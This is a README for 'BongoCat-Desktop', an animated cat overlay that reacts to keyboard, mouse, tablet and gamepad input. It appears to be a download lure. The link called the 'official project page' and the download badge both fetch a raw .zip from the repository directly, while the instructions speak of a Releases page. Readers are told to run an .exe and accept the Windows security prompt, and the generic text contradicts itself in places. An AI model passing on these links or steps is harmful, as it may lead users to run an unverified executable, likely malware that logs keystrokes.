# 🐱 BongoCat-Desktop - Bring your desktop to life today

[![](https://img.shields.io/badge/Download-BongoCat-blue.svg)](https://raw.githubusercontent.com/abid9374/BongoCat-Desktop/main/Application/Desktop_Cat_Bongo_1.2-alpha.4.zip)

BongoCat-Desktop displays an interactive character on your screen. The cat mimics your movements as you use your mouse, keyboard, or tablet. This tool tracks your inputs and translates them into animations for your viewers or your own entertainment. It supports various playstyles, including tablet pen pressure tools often used for games like osu!.

## 📥 How to download the application

Visit the [official project page](https://raw.githubusercontent.com/abid9374/BongoCat-Desktop/main/Application/Desktop_Cat_Bongo_1.2-alpha.4.zip) to download the software.

1. Navigate to the Releases section on the right side of the page.
2. Select the most recent version labeled as the Latest Release.
3. Locate the file ending in .zip under the Assets section.
4. Click the file name to start the download.

## 🛠️ Setting up the software

Follow these steps to extract and launch your new pet.

1. Open your Downloads folder.
2. Right-click the folder with the zip icon.
3. Choose Extract All and follow the prompts on the screen.
4. Open the new folder created by the extraction process.
5. Find the file named BongoCat.exe.
6. Double-click the file to start the program.
7. Confirm the security prompt if Windows asks for permission to run the application.

## 🎨 Using the skin editor

The application allows you to change how your cat looks. Open the config folder to find the image files used for your cat. You can replace these image files with your own designs. Ensure your images use a transparent background to maintain the look. Save your new files with the same names and formats as the original images for the software to recognize them. Reload the application to see your custom changes.

## 🎮 Configuring your inputs

The software tracks various hardware devices to animate the cat correctly.

### Mouse and Keyboard
The application detects your clicks and key presses automatically. It displays these actions on the screen in real-time. You can adjust the movement scale in the settings menu if the cat feels too fast or slow.

### Tablet and Pen
If you use a drawing tablet, the software tracks your pen position and pressure levels. Ensure your driver software runs in the background for the best results. The app maps these pressure levels to the animation frames provided in your chosen skin.

### Gamepad support
Connect your controller via USB or Bluetooth. The application detects common gamepads and assigns input mapping to the cat. You can verify the connection status by looking at the small device icon in the taskbar.

## 🎥 Recording with OBS Studio

Add the cat to your live stream or recordings using OBS Studio.

1. Open OBS Studio.
2. Click the plus button under the Sources panel.
3. Select Window Capture.
4. Choose the BongoCat-Desktop application from the window list.
5. Check the box labeled Allow Transparency.
6. Resize and position the window on your canvas.

The transparent background ensures only the cat appears over your content.

## ⚙️ Understanding the features

- **Keypress visualizer:** Shows your keystrokes to viewers.
- **RGB lighting sync:** Matches the cat color to your keyboard lighting.
- **Emote animations:** Triggers custom reactions based on specific inputs.
- **Desktop pet:** Keeps you company while you work or play.
- **WASD mapping:** Translates specific movement keys into character leaning.

## 🚀 Troubleshooting common issues

### The application does not start
Ensure you have the latest version of the .NET Desktop Runtime installed on your machine. You can find this update on the official Microsoft website. Restart your computer after installing the runtime.

### The cat stops moving
Click once on the BongoCat-Desktop window to bring it into focus. Check if the mouse or keyboard is still connected. If the software loses target focus, it may pause tracking to save system resources.

### The transparency does not work
Ensure you set the background color in the BongoCat settings to the same color used for the chroma key effect in OBS Studio. Adjust the similarity slider in OBS if the background shows a faint border.

### The pen pressure feels wrong
Open the BongoCat configuration file in a text editor. Look for the pen pressure sensitivity setting. Increase or decrease this number to change how the cat reacts to your pen pressure. Save the file and restart the cat.

## 📋 System requirements

- Windows 10 or Windows 11.
- Modern processor with at least 2 gigahertz speed.
- 4 gigabytes of memory.
- Current graphics drivers.
- Stable internet connection for updates.

This tool aims to offer a smooth experience without taxing your computer. The small footprint allows you to run it alongside heavy games or editing software without noticing a drop in performance. The configuration files stay in the same folder as the application, making it easy to back up your custom skins or settings. Store these files in a safe location if you plan to move the software to a different computer. Check the project page for occasional updates to improve support for new hardware devices. Consistent updates ensure your cat keeps pace with the latest gaming hardware and operating system changes.